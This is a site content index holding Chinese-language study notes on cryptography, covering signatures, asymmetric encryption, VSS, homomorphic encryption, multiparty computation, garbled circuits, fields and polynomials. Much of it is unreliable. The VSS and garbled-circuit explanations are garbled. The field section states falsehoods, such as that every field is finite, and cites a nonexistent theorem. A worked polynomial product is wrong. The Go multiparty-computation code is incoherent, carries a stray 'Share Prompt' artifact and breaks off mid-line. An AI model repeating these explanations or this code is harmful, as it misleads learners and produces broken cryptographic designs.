Algorithm）是另一种基于椭圆曲线密码学的数字签名算法，与ECDSA类似。EdDSA使用特殊的Edwards曲线，提供了较高的性能和安全性。常见的EdDSA变体包括Ed25519和Ed448。\n\n数字签名的应用\n数字签名在多种场景中都发挥着关键作用，以下是一些常见的应用：\n\n安全通信：数字签名用于保障通信双方的身份真实性和数据完整性。例如，在安全套接字层（SSL）/传输层安全（TLS）协议中，数字签名用于验证服务器和客户端的证书，确保通信过程中的安全性。\n电子邮件安全：数字签名用于验证电子邮件的发送者身份和内容完整性。常见的电子邮件签名标准包括PGP（Pretty Good Privacy）和S/MIME（Secure/Multipurpose Internet Mail Extensions）。\n软件安全：数字签名用于验证软件包的完整性和来源。开发者可以对软件包进行签名，用户在下载和安装软件时可以验证签名，确保软件没有被篡改或伪造。\n加密货币：在加密货币（如比特币）系统中，数字签名用于验证交易的有效性和用户身份。用户使用私钥对交易进行签名，其他用户可以使用公钥验证签名，确保交易的安全性和不可篡改性。\n\n总之，数字签名是一种重要的密码学技术，为数据完整性和身份验证提供了可靠的保障。了解数字签名的原理和应用，有助于我们在实际场景中更好地利用数字签名技术来确保数据安全。\n\n"},"blockchainguide/Public_Chain_Development/Cryptography/基础/非对称加密":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/基础/非对称加密","filePath":"blockchainguide/Public_Chain_Development/Cryptography/基础/非对称加密.md","title":"非对称加密","links":[],"tags":[],"content":"非对称加密\n非对称加密，也称为公钥加密，是一种使用不同的密钥进行加密和解密的密码学技术。它通过引入一对密钥，即公钥和私钥，提供了更强大的安全性和便捷的密钥管理。以下是对非对称加密原理的详细介绍。\n什么是非对称加密？\n在非对称加密中，密钥分为两种：公钥和私钥。公钥用于加密数据，私钥用于解密数据。公钥是公开的，任何人都可以使用它来加密信息。私钥则需要保密，仅持有者可以解密由公钥加密的信息。同样，私钥也可以用于加密数据，然后使用公钥解密，这种方式常用于数字签名。\n非对称加密的优点在于解决了密钥分发问题，因为公钥可以公开传播，而无需担心安全性。然而，非对称加密的缺点是计算速度较慢，不适用于大量数据的加密。\n非对称加密的应用场景\n非对称加密的主要应用场景包括：\n\n安全通信：通过公钥加密消息，确保只有私钥持有者能够解密。这样可以在不安全的通信环境中保护数据的机密性。\n数字签名：使用私钥对消息生成签名，然后使用公钥进行验证。这样可以确保消息的完整性和来源。\n密钥交换：非对称加密可以与对称加密结合使用，通过公钥加密对称密钥，实现安全地传输和共享对称密钥。\n\n常见的非对称加密算法\n以下是一些常见的非对称加密算法：\n\n\nRSA：RSA是一种广泛使用的非对称加密算法，基于大数分解问题。RSA算法的安全性依赖于大数分解问题的计算难度。RSA支持加密、解密和数字签名等功能。\n\n\nECC（Elliptic Curve Cryptography）：ECC是一种基于椭圆曲线数学的非对称加密算法。相较于RSA，ECC在相同的安全级别下可以使用更短的密钥，从而降低计算和存储开销。ECC可以应用于加密、解密和数字签名等场景。\n\n\nElGamal：ElGamal是一种基于离散对数问题的非对称加密算法。与RSA类似，ElGamal算法的安全性依赖于离散对数问题的计算难度。ElGamal主要应\n\n\n用于加密和数字签名。\n\nDSA（Digital Signature Algorithm）：DSA是一种基于离散对数问题的数字签名算法。与RSA相比，DSA仅支持数字签名，不支持加密和解密。DSA的一个变种是ECDSA（Elliptic Curve Digital Signature Algorithm），它将DSA与椭圆曲线密码学相结合，提供了更高的安全性和性能。\nDiffie-Hellman密钥交换：Diffie-Hellman算法是一种基于离散对数问题的密钥交换协议。它允许通信双方在公开通道上交换信息，以生成共享密钥。虽然Diffie-Hellman本身不是加密算法，但它在非对称加密中发挥着关键作用，用于在不安全的通信环境中安全地交换对称密钥。\n\n非对称加密的安全性与性能\n非对称加密算法的安全性主要取决于其所基于的数学问题（如大数分解、离散对数等）的计算难度。随着密钥长度的增加，攻击者破解密钥的难度呈指数级增长。然而，增加密钥长度也会影响加密和解密的性能。\n非对称加密算法通常比对称加密算法更慢，因为它们涉及到复杂的数学运算。在实际应用中，通常将非对称加密与对称加密结合使用，以实现更高的安全性和效率。例如，在TLS/SSL协议中，双方首先使用非对称加密算法（如RSA、ECC）交换对称密钥，然后使用对称加密算法（如AES）加密实际数据。\n总之，非对称加密是一种强大且灵活的密码学技术，它通过使用一对密钥（公钥和私钥）解决了密钥分发问题，提供了数据加密、数字签名和密钥交换等功能。了解非对称加密的原理和常见算法，将有助于我们在实际应用中更好地利用加密技术来保护数据和通信安全。\n\n"},"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/VSS协议":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/VSS协议","filePath":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/VSS协议.md","title":"VSS协议","links":[],"tags":[],"content":"VSS（Verifiable Secret Sharing）秘密共享协议是一种安全的分布式算法，用于将秘密（如密钥）分割成多个份额，然后将这些份额分配给不同的参与方。只有在获得足够数量的份额时才能重建原始秘密。\nVSS协议由多个参与方共同完成，其中至少需要t+1个参与方才能重构原始秘密，其中t为恶意参与方的数量。即，只要有少于t+1个恶意参与方，那么原始秘密就可以被恢复。此外，VSS协议还具有可验证性，因此每个参与方都可以证明它们的份额确实是由原始秘密生成的。\n在VSS协议中，首先需要选择一个大素数p和一个生成元g，然后将密钥k分解成k = k_0 + k_1，其中k_0和k_1都是随机数，并且k_0是在每个参与方之间共享的秘密。然后，每个参与方i都生成一个随机数r_i，并计算出g^{r_i} 和 h_i = k_0 g^{r_i} + k_1 g^{r_i}，将其发送给其他参与方。\n然后，每个参与方都可以计算出h = Π_{i=1}^{n} h_i^{λ_i}，其中λ_i是Lagrange插值多项式中的系数，以确保对于每个i，当计算h时，只考虑到参与方i的份额。如果只有t个参与方，那么由于我们需要至少t+1个份额才能重构原始密钥，因此必须忽略不诚实的参与方的份额，以避免泄漏原始密钥。\n最后，通过计算h和k_0之间的比率，可以得到k_1的值，从而重构原始密钥。此外，每个参与方都可以使用自己的份额来验证其它参与方的份额是否真实，并且确保h是正确计算的。\nVSS（Verifiable Secret Sharing）协议在实际工程应用中有许多场景，以下是其中几个常见的应用场景：\n\n加密货币钱包：在加密货币钱包中，密钥的安全性非常重要。使用VSS协议将密钥分割成多个份额，并分配给不同的参与方，以确保密钥只有在获得足够数量的份额时才能被重构，从而保护用户的资产安全。\n多方数据共享：在多方数据共享场景中，多个参与方需要共享敏感数据，但又不想将所有数据集中存储在一个地方。使用VSS协议将数据分割成多个份额，并分配给不同的参与方，以确保只有在获得足够数量的份额时才能重构原始数据。\n分布式密钥管理系统：在分布式系统中，多个节点需要共同管理密钥，使用VSS协议将密钥分割成多个份额，并分配给不同的参与方，以确保密钥只有在获得足够数量的份额时才能被重构，从而保护密钥的安全性。\n分布式存储系统：在分布式存储系统中，多个节点需要共同存储数据，使用VSS协议将数据分割成多个份额，并分配给不同的节点，以确保只有在获得足够数量的份额时才能重构原始数据，从而保护数据的安全性。\n\n总之，VSS协议可以用于各种需要保护秘密的场景，特别是需要多方参与的场景，使得秘密的分配和管理更加安全可靠。"},"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/不经意传输协议":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/不经意传输协议","filePath":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/不经意传输协议.md","title":"不经意传输协议","links":[],"tags":[],"content":""},"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/参考的资料":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/参考的资料","filePath":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/参考的资料.md","title":"参考的资料","links":[],"tags":[],"content":"blog.csdn.net/jingzi123456789/article/details/105832143\nwww.openmpc.com/article/169"},"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/同态加密":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/同态加密","filePath":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/同态加密.md","title":"同态加密","links":[],"tags":[],"content":"同态加密（homomorphic encryption）是一种特殊的加密技术，它可以在加密的状态下执行某些运算，而无需解密数据。具体来说，如果存在一个加密函数E，它可以将明文m加密为密文c，那么同态加密函数就是一个函数H，它可以在密文域上执行某些操作，生成一个新的密文，使得解密操作应用于该密文所得的结果等效于在明文域上执行相应的操作。\n同态加密通常分为完全同态加密和部分同态加密两种类型。完全同态加密允许对密文进行任意的加法和乘法操作，而部分同态加密只允许对密文进行有限的加法或乘法操作。\n同态加密的应用非常广泛，特别是在安全多方计算、隐私保护、云计算等领域有着广泛的应用。其主要原因是同态加密可以在不破坏数据隐私的情况下进行数据计算，使得数据处理更加高效和安全。\n下面我将详细解释同态加密的原理和实现，以及其在安全多方计算中的应用。\n一、同态加密的原理\n1.1 基本概念\n同态加密的基本思想是，将明文m加密为密文c后，对密文c进行一系列的运算，最终得到一个新的密文c’，使得解密操作应用于c’所得的结果等效于在明文域上执行相应的操作。\n具体来说，设明文m、密文c和加密函数E满足以下条件：\nm是一个整数，且E(m)是整数m的一个密文。\n加密函数E和解密函数D满足如下关系：\nD(E(m)) = m\n对于两个密文c1和c2，定义c1+c2为它们在明文域上的和的密文。\n对于两个密文c1和c2，定义c1*c2为它们在明文域上的积的密文。\n对于一个密文c和一个整数n，定义nc为n乘以c的密文。\n同态加密函数H的定义如下：\n设c1和c2是两个密文，那么H(c1, c2) = c1 + c2\n设c1和c2是两个密文，那么H(c1, c2) = c1 * c2\n设c是一个密文，n是一个整数，那么H(c, n) = nc\n同态加密函数H满足如下性质：\n设m1和m2是两个明文，c1 = E(m1)，c2 = E(m2)，那么H(c1, c2) = E(m1 + m2)\n设m1和m2是两个设m1和m2是两个整数，加密算法Enc_k(m)将明文m加密成密文c，其中k是密钥，即Enc_k(m) = c。同态加密算法能够满足以下性质：\n\n加法同态性质：对于加法操作m1 + m2，有Enc_k(m1 + m2) = Enc_k(m1) + Enc_k(m2)；\n乘法同态性质：对于乘法操作m1 × m2，有Enc_k(m1 × m2) = Enc_k(m1) × Enc_k(m2)；\n同态加密算法的安全性：即使攻击者拥有所有的密文，也不能从密文中推断出任何关于明文的信息。\n\n基于这些性质，可以进行一些保护隐私的计算，例如在不暴露明文的情况下进行加法和乘法等计算。比如，如果想要计算两个人的年龄总和，但是不想暴露具体的年龄信息，就可以先用同态加密算法将年龄加密，然后在加密的状态下进行计算，最后再解密得到结果。\n同态加密算法的实现有多种方式，例如基于离散对数问题的ElGamal加密、基于RSA问题的Paillier加密等。这些算法的实现都比较复杂，需要涉及到数论、模运算等数学知识，同时也需要考虑到实际应用中的性能和安全等方面的问题。因此，在实际使用时需要综合考虑多种因素，选择最合适的同态加密算法。"},"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/同态加密vs多方安全计算协议":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/同态加密vs多方安全计算协议","filePath":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/同态加密vs多方安全计算协议.md","title":"同态加密vs多方安全计算协议","links":[],"tags":[],"content":"同态加密协议和多方安全计算协议都是隐私保护相关的协议，但是它们的实现方式和解决问题的方式不同。\n同态加密协议的主要目的是允许对加密的数据进行计算，而无需解密它们。因此，同态加密协议通常用于数据隐私保护，例如在云计算中。同态加密协议的基本思想是对数据进行加密，使得密文上的操作结果与明文上的结果相同。同态加密协议可以分为完全同态加密和部分同态加密两种类型。\n多方安全计算协议的主要目的是允许多个参与者共同计算一个函数，而不暴露彼此的私密输入。多方安全计算协议可以分为基于加密的协议和基于非加密的协议两种类型。基于加密的多方安全计算协议通常使用同态加密技术实现，但是其目的是在保护隐私的同时允许多个参与者进行计算。基于非加密的多方安全计算协议通常使用秘密共享技术来保护隐私，并且可以在不知道其他参与者私密输入的情况下进行计算。\n因此，同态加密协议和多方安全计算协议都是隐私保护相关的协议，但是它们的实现方式和目的不同。"},"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/基于seal的smpc协议":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/基于seal的smpc协议","filePath":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/基于seal的smpc协议.md","title":"基于seal的smpc协议","links":[],"tags":[],"content":"sequenceDiagram\n    participant P1 as 参与者1\n    participant P2 as 参与者2\n    participant P3 as 参与者3\n    participant C as 计算节点\n\n    P1-&gt;&gt;+C: 密钥生成\n    P2-&gt;&gt;+C: 密钥生成\n    P3-&gt;&gt;+C: 密钥生成\n    C--&gt;&gt;-P1: 公钥1\n    C--&gt;&gt;-P2: 公钥2\n    C--&gt;&gt;-P3: 公钥3\n\n    P1-&gt;&gt;+C: 密封输入1\n    P2-&gt;&gt;+C: 密封输入2\n    P3-&gt;&gt;+C: 密封输入3\n    C--&gt;&gt;-P1: 密封消息1\n    C--&gt;&gt;-P2: 密封消息2\n    C--&gt;&gt;-P3: 密封消息3\n\n    P1-&gt;&gt;+C: 密封计算结果1\n    P2-&gt;&gt;+C: 密封计算结果2\n    P3-&gt;&gt;+C: 密封计算结果3\n    C--&gt;&gt;-P1: 密封结果1\n    C--&gt;&gt;-P2: 密封结果2\n    C--&gt;&gt;-P3: 密封结果3\n\n    P1-&gt;&gt;+C: 密钥1解密结果\n    P2-&gt;&gt;+C: 密钥2解密结果\n    P3-&gt;&gt;+C: 密钥3解密结果\n    C--&gt;&gt;-P1: 解密结果1\n    C--&gt;&gt;-P2: 解密结果2\n    C--&gt;&gt;-P3: 解密结果3\n\n    P1-&gt;&gt;+C: 合并解密结果\n    P2-&gt;&gt;+C: 合并解密结果\n    P3-&gt;&gt;+C: 合并解密结果\n    C--&gt;&gt;-P1: 最终结果\n    C--&gt;&gt;-P2: 最终结果\n    C--&gt;&gt;-P3: 最终结果\n\n\n在这个流程图中，包括三个参与者和一个计算节点。其中，参与者1、2、3生成各自的公私钥对，并将公钥发送给计算节点。随后，参与者1、2、3将自己的输入进行密封，并发送给计算节点。计算节点对密封的输入进行计算，并将计算结果进行密封后发送给参与者1、2、3。参与者1、2、3对密封的计算结果进行解密，并将解密结果发送给计算节点。最后，计算节点将三个解密结果合并后输出最终结果。\n应用\n基于密封的安全多方计算协议在隐私保护和安全计算领域有很广泛的应用，以下是一些例子：\n\n选举投票：类似于我们之前实现的加密选举例子，可以使用基于密封的安全多方计算协议来保护选民的隐私，确保选举结果的准确性和公正性。\n数据隐私保护：在云计算和大数据分析中，数据隐私保护是一个很重要的问题。基于密封的安全多方计算协议可以让多个参与者在不泄露私密数据的前提下对数据进行计算、分析和共享。\n医疗数据共享：医疗数据隐私保护也是一个很重要的问题。基于密封的安全多方计算协议可以让多个医疗机构在不泄露病人隐私的前提下对医疗数据进行计算、分析和共享。\n联合学习：联合学习是一种在分布式设备上进行机器学习的方法，它可以用于保护参与者的隐私。基于密封的安全多方计算协议可以用于保护联合学习中的数据隐私和模型隐私。\n区块链隐私保护：区块链技术可以保证交易记录的公开和透明，但是交易参与者的隐私往往无法得到保护。基于密封的安全多方计算协议可以用于在区块链上进行隐私保护和安全计算。\n"},"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/安全多方计算":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/安全多方计算","filePath":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/安全多方计算.md","title":"安全多方计算","links":[],"tags":[],"content":"原理\nSMPC的核心思想是将计算分解成多个子任务，并将它们分配给参与者进行计算，最终将结果合并。这种分离的过程可以使每个参与者只了解到必要的信息，而不会暴露任何个人数据。在SMPC中，每个参与者都拥有一些私密数据，并希望通过合作计算以某种方式利用它们。因此，SMPC中有多个角色，包括输入者、计算者和输出者。输入者将其私密数据输入到系统中，计算者对这些数据进行计算，并生成输出结果，输出者获取计算结果。\n常见协议\n基于密封的SMPC协议\n在传统的SMPC协议中，参与者需要交互通信来共享其份额和计算结果。在密封的SMPC协议中，参与者无需直接交互，也不需要共享其份额，从而提高了安全性和隐私性。\n密封的SMPC协议可以分为两种类型：秘密共享密封和伪随机函数密封。在秘密共享密封中，每个参与者仅需要将其份额通过安全算法进行加密，然后将其发送给其他参与者，其他参与者可以解密它们的份额，以便计算结果。在伪随机函数密封中，参与者将其份额发送到一个加密的函数，而不是发送到其他参与者。加密的函数是基于伪随机函数（PRF）生成的，每个参与者都可以使用该函数解密其份额，以便计算结果。密封的SMPC协议不仅提高了隐私和安全性，还避免了参与者之间的通信成本。\n密封的SMPC协议的实现方式可以分为以下步骤：\n\n每个参与者将其私有输入分割成多个份额，并将每个份额加密。\n每个参与者将其加密的份额发送到加密函数中，或将其加密的份额发送给其他参与者。\n参与者使用加密函数或解密其他参与者的份额，并计算结果。\n计算结果通过SMPC协议的安全算法解密，以确保结果的保密性和完整性。\n\n密封的SMPC协议的优点包括：\n\n避免了参与者之间的交互，降低了通信成本。\n提高了隐私和安全性，每个参与者只需要解密自己的份额，无需直接访问其他参与者的份额。\n可以采用伪随机函数来实现密封，进一步提高安全性。\n\n三、密封的SMPC协议的应用\n密封的SMPC协议可以应用于许多场景，包括金融、医疗、社交媒体、数据挖掘和机器学习等。\n在金融领域，SMPC协议可以用于股票交易、投资组合管理和风险管理等。例如，可以使用SMPC协议来计算一个投资组合的总价值，而不会暴露投资者的持股数量和价格。\n在医疗领域，SMPC协议可以用于医学数据的隐私保护。例如，可以使用SMPC协议来计算医疗研究中的平均值、方差等统计指标，而不会暴露个人的医疗数据。\n在社交媒体中，SMPC协议可以用于隐私保护和数据分析。例如，可以使用SMPC协议来计算用户群体的兴趣、趋势和行为，而不会暴露个人的数据。\n在数据挖掘和机器学习中，SMPC协议可以用于保护数据隐私。例如，可以使用SMPC协议来进行分类、聚类、回归和推荐等任务，而不会暴露训练数据。\n四、实现一个简单的密封的SMPC协议\n下面我们将通过一个简单的例子来演示如何实现密封的SMPC协议。\n假设有三个参与者A、B、C，他们希望计算出两个数的和，但是不想互相透露各自的输入。他们可以使用密封的SMPC协议来实现这个目标。\n首先，每个参与者将自己的输入分成两个份额，并对每个份额进行加密。假设输入分别为a=3，b=5，每个份额都使用AES算法进行加密，并使用伪随机函数生成加密密钥，密钥长度为128位。\nShare Prompt\n通过一个简单的例子来演示如何实现密封的SMPC协议。\n假设有三个参与者A、B、C，他们希望计算出两个数的和，但是不想互相透露各自的输入。他们可以使用密封的SMPC协议来实现这个目标。\n首先，每个参与者将自己的输入分成两个份额，并对每个份额进行加密。假设输入分别为a=3，b=5，每个份额都使用AES算法进行加密，并使用伪随机函数生成加密密钥，密钥长度为128位。\ngoCopy code\na := big.NewInt(3)\nb := big.NewInt(5)\n\n// 使用伪随机函数生成加密密钥\nkey, err := prf(prfKey, []byte(&quot;example-key&quot;))\nif err != nil {\n    log.Fatalf(&quot;Failed to generate key: %v&quot;, err)\n}\n\n// 将输入分成两个份额，并加密\na1, a2 := encryptAES(a.Bytes(), key)\nb1, b2 := encryptAES(b.Bytes(), key)\n\n然后，每个参与者将自己的加密份额发送给其他参与者，或者发送给加密函数。\ngoCopy code\n// 参与者A发送其加密份额给参与者B和参与者C\nb1A, c1A := sendEncryptedShares(a1)\n\n// 参与者B发送其加密份额给参与者A和参与者C\na1B, c1B := sendEncryptedShares(b1)\n\n// 参与者C将其加密份额发送给加密函数\n_, c1C := sendEncryptedShares(a2)\n_, c2C := sendEncryptedShares(b2)\n\n在这个例子中，我们将参与者C作为加密函数，他将使用伪随机函数来解密份额，计算结果，并将结果再次加密，以便参与者可以解密。\n参与者A和参与者B需要计算出他们的份额之和。他们可以使用密封的SMPC协议来计算，并将计算结果发送给参与者C。\ngoCopy code\n// 参与者A和参与者B计算他们的份额之和\nsumAB := new(big.Int).Add(a1, b1)\n\n// 参与者A和参与者B将计算结果发送给参与者C\nsumABEnc := encryptAES(sumAB.Bytes(), key)\n_, sumABC := sendEncryptedShares(sumABEnc)\n\n最后，参与者C使用伪随机函数解密份额，计算结果，并将结果再次加密。\ngoCopy code\n// 参与者C使用伪随机函数解密份额，并计算结果\nsumABEnc, err := prf(prfKey, []byte(&quot;example-key&quot;))\nif err != nil {\n    log.Fatalf(&quot;Failed to generate key: %v&quot;, err)\n}\n\nsumAB := new(big.Int).SetBytes(decryptAES(sumABEnc, c1C, c1B))\nsumAB.Add(sumAB, new(big.Int).SetBytes(decryptAES(sumABEnc,\n\n// 参与者C将计算结果加密，并发送给参与者A和参与者B sumABEnc = encryptAES(sumAB.Bytes(), key) sumABA, _ := sendEncryptedShares(sumABEnc)\nscssCopy code\n\n现在，参与者A和参与者B可以解密参与者C发送的加密计算结果，以获得最终的和。\n\n```go\n// 参与者A和参与者B解密加密计算结果，获得最终的和\nsumABEnc = decryptAES(sumABA, b1A, c1A)\nsumAB = new(big.Int).SetBytes(sumABEnc)\n\nfmt.Printf(&quot;Sum of a and b: %v\\n&quot;, sumAB)   \n\n在这个例子中，我们使用了伪随机函数来生成加密密钥，并使用AES算法来加密和解密数据。我们还使用了两个函数来发送和接收加密份额，以便参与者之间不知道彼此的输入。\n密封的SMPC协议是实现安全多方计算的一种有效方法。它允许参与者在不透露输入的情况下计算出结果。这种协议可以应用于许多不同的场景，如金融交易、医疗保健和社交网络，以确保参与者的隐私和数据安全。\n基于秘密共享的SMPC协议\n基于秘密共享的SMPC协议将数据分成多个部分，并将这些部分分配给参与者。在这种协议中，数据不是加密，而是使用一种特殊的方法分成多个部分，并将这些部分分配给多个参与者。每个参与者只能看到自己分配的部分，而无法获得完整的数据。在计算过程中，每个参与者都执行一些计算，然后将结果发送给其他参与者。最终，所有参与者将计算结果合并，得出最终结果。这种方式可以确保数据的隐私性和保密性，因为任何一个参与者都只能看到数据的一部分，并且不能获得完整的数据。\nSMPC的分类\n根据SMPC的不同实现方式，可以将其分为以下几类：\n\n基于密码学原语的SMPC\n\n基于密码学原语的SMPC是最基本的SMPC实现方式。它使用密码学原语，如加密、哈希和数字签名等，来确保数据的保密性和完整性。该方法通常需要大量的计算资源和时间，因此只适用于小规模的数据计算。\n\n基于安全多方计算协议的SMPC\n\n基于安全多方计算协议的SMPC使用特定的协议来实现多方计算。这些协议包括加法协议、乘法协议和比较协议等。这些协议使用复杂的算法来实现多方计算，可以实现大规模的数据计算。此外，这种方法还可以通过对协议进行优化来提高计算速度和效率。\n\n基于硬件的SMPC\n\n基于硬件的SMPC使用专用的硬件来实现计算，包括FPGA（现场可编程门阵列）和ASIC（专用集成电路）等。这些硬件通常具有高速的计算能力和低功耗，因此可以提高SMPC的计算速度和效率。此外，基于硬件的SMPC还可以提供更高的安全性，因为硬件可以实现更复杂的加密算法和保护机制。\n设计场景\n设计一个投票系统，多人互相投票，每个人只能投一次票， 每个人投票只有自己知道，投票最高的人胜出，且每个人可以对投票结果进行验证，计算节点要有多个，且能防止作恶，同时，投票者也需要能防止作恶"},"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/混淆电路框架":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/混淆电路框架","filePath":"blockchainguide/Public_Chain_Development/Cryptography/安全多方计算/混淆电路框架.md","title":"混淆电路框架","links":[],"tags":[],"content":"混淆电路（oblivious circuit）是一种安全计算技术，可以将输入数据保持私密，并在不泄露私密信息的同时，计算出函数的结果。混淆电路框架是一种通用的实现混淆电路的方式，它可以将任何电路转化为混淆电路，使得输出结果不依赖于输入数据，并且输入数据保持私密。\n混淆电路框架的基本思想是，将一个电路分解成多个组件，每个组件的输入和输出都是明文，但组件之间的连接和计算过程都是加密的。这样，每个组件只知道自己的输入和输出，而对其他组件的输入和输出一无所知，从而实现了保护隐私的目的。\n具体来说，混淆电路框架分为两个阶段：编码阶段和执行阶段。\n在编码阶段，将要计算的电路转化为一个混淆电路，并将其分解成多个组件。每个组件都由两个函数组成：加密函数和解密函数。加密函数用于将明文输入加密成密文，解密函数用于将密文输出解密成明文。组件之间的连接和计算过程都是加密的，因此每个组件只知道自己的输入和输出，而对其他组件的输入和输出一无所知。\n在执行阶段，每个输入方将输入数据通过加密函数加密成密文，然后将密文输入到混淆电路中，由执行阶段的参与者进行计算，并输出密文结果。最后，每个输出方将输出的密文通过解密函数解密成明文，得到计算结果。\n混淆电路框架的关键问题是如何设计加密和解密函数，使得组件之间的计算过程和连接都是保密的。一种常用的做法是使用同态加密技术，将加密函数和解密函数都设计为同态加密算法，从而实现组件之间的保密计算。另外，混淆电路框架还需要考虑性能和可扩展性等问题，以便在实际应用中能够实现高效的计算和处理。\n总的来说，混淆电路框架是一种重要的安全计算技术，可以在保护隐私的同时，实现计算结果的安全计算和传输。在实际应用中，混淆电路框架被广泛应用于保护隐私和实现数据安全计算，如隐私保护数据挖掘、机器学习、数据共享等领域。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_域":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_域","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_域.md","title":"代数_域","links":[],"tags":[],"content":"域的定义、性质和分类\n定义\n数学中，域是一种数学结构，它包括一个非空的集合和两个二元运算：加法和乘法，满足以下公理：\n\n加法和乘法都是封闭的（也就是说，对于任意的元素 a 和 b，a+b 和 ab 仍然在域中）。\n加法和乘法都是可交换的（也就是说，对于任意的元素 a 和 b，a+b=b+a 和 ab=ba）。\n加法和乘法都是结合的（也就是说，对于任意的元素 a、b 和 c，a+(b+c)=(a+b)+c 和 a(bc)=(ab)c）。\n存在加法单位元 0 和乘法单位元 1（也就是说，对于任意的元素 a，a+0=a 和 a*1=a）。\n每个元素在加法和乘法下都有一个负元素和倒数元素。也就是说，对于任意的元素 a，存在一个元素 -a 满足 a+(-a)=0，并且存在一个元素 a^{-1} 满足 aa^{-1}=1。\n\n性质\n域的定义表明了它的一些重要的性质和特征，包括：\n\n在一个域中，两个不等于0的元素的乘积不可能等于0。\n域的元素个数是有限的，但它的大小可以是任意的。\n单位元是唯一的，但是一个元素可以有多个负元素和倒数元素。\n在一个有限域中，加法和乘法都是封闭的，并且存在一些元素的幂等，具有以下性质：\n\n它们的平方等于自身。\n所有的元素都可以表示成 1 的幂的线性组合。\n\n\n\n分类\n域可以根据不同的属性进行分类。其中一些常见的分类包括：\n代数域和超越域\n代数域是指一个包含有理数的域，它的每个元素都可以表示为有理系数多项式的根。因此，代数域包含了所有的代数数。例如，实数和复数都是代数域。\n超越域是指一个不包含有理数的域，它的所有元素都是超越数。例如，实函数域和复函数域都是超越域。\n有限域和无限域\n有限域是指一个元素数量有限的域。例如，有限域可以是 Z_p，其中所有的计算都是对模 p 取余。无限域是指域的元素数量是无限的，例如实数域或复数域。\n特征\n一个域的特征指一个最小的正整数 n，使得 n * 1 = 0，如果不存在这样的数 n，则特征为0。域的特征是其一个重要的特征，它可以分为以下两类：\n\n特征为素数 p 的域。例如，有限域 Z_p 的特征为 p。这些域也被称为 Galois 域，因为它们的表示形式（即 Galois 字段）提供了一个继承的方式来构建有限域。\n特征为0的域，例如实数域。\n\n子域\n一个域的子集，如果它对相同的加法和乘法满足域公理，则它是该域的子域。例如，实数域的子域包括有理数域和所有代数数域。\n扩张域\n一个域 E 是另一个域 F 的扩张，如果 F 是 E 的子域。例如，复数域是实数域的扩张。扩张域是域论中一个重要的概念，它可以用于解决一系列基本的问题，如勒让德-格斯陶里定理和费马大定理等。\n结论\n因此，域是一个重要的数学结构，它包含了一个非空的集合和两个二元操作：加法和乘法。域的定义，性质和分类提供了一个清晰的框架来描述和理解域及其相关的概念。在数学和计算机科学中，域的研究是非常重要的，因为它在众多的应用中都扮演了不可替代的角色。这些应用依赖于域的数学结构和操作特性，如密码学，编码理论，算法设计等。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_多项式":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_多项式","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_多项式.md","title":"代数_多项式","links":[],"tags":[],"content":"多项式及其运算\n一、多项式的定义\n多项式（Polynomial）是由一系列变量和常量以及它们之间的加、减和乘法运算构成的表达式。例如，x^2+3x−5 就是一个二次多项式。多项式的变量通常用字母表示，常数可以是实数、有理数、复数等。\n一个多项式一般可以表示为：P(x)=a_nx^n+a_{n-1}x^{n-1}+...+a_2x^2+a_1x^1+a_0\n其中，a_i 为常数系数，x 为变量，n 为多项式的次数（最高次项的指数）。多项式次数为 n，则叫做 n 次多项式，其中，a_n 不等于 0。\n二、多项式的运算\n多项式有加法、减法、乘法、除法和取模等基本运算。\n1. 加法和减法\n两个多项式的加法定义为把相同项的系数相加起来，不同项保留原来的系数。例如，给定两个多项式 P(x) = 2x^2 + 5x + 3 和 Q(x) = 3x^2 + 2x + 7，则它们的和为 P(x)+Q(x) = (2+3)x^2 +(5+2)x +(3+7) = 5x^2 + 7x + 10，差为 P(x)-Q(x) = -x^2 +3x -4。\n2. 乘法\n两个多项式的乘法定义为把两个多项式中的每一项相乘，然后将相同项的幂次的系数相加。例如，给定两个多项式 P(x) = 2x^2 + 3x + 4 和 Q(x) = x^3 + 5x^2 + 6，则它们的积为 P(x)Q(x) = (2x^2 + 3x + 4)(x^3 +5x^2 +6)，展开得到：\\begin{aligned} P(x)Q(x) &amp;= 2x^5 + 13x^4 + 32x^3 + 39x^2 + 18x + 24 \\end{aligned}\n3. 除法\n多项式除法是指用除数 D(x) 去除被除数 N(x)。通过 Polynomial Long Division 算法进行多项式除法。对于多项式 N(x)，存在唯一两个多项式 D(x)、R(x)，使得N(x)=D(x)Q(x)+R(x)，且 R(x) 的次数小于 D(x) 的次数。\n4. 取模\n多项式模运算是指除法后的余数。例如，给定两个多项式 N(x) 和 D(x)，则 N(x) 对 D(x) 取模的结果为 N(x) 除以 D(x) 的余数。\n三、多项式的重要定理\n1. 余数定理\n多项式 P(x) 除以 